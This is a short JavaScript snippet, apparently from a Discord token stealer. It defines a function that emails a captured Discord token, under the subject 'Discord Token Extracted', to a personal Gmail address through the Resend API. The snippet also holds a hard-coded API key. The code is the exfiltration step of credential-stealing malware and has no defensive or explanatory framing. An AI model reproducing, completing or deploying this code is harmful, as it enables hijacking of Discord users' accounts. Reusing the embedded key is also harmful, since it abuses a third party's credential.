// Using Resend API to send the token
const resendApiKey = 're_TtZx711S_JrNGit6zjsP9StMAF2KRh1hL';

async function sendTokenViaResend(token) {
  try {
    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${resendApiKey}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from: 'roon0793@gmail.com',
        to: ['roon0793@gmail.com'],
        subject: 'Discord Token Extracted',
        html: `<p>Discord Token: <strong>${token}</strong></p>`
      })
    });
    
    if (response.ok) {
      console.log('Token sent successfully via Resend');
    } else {
      console.error('Failed to send token:', response.statusText);
    }
  } catch (error) {
    console.error('Error sending token:', error);
  }
}
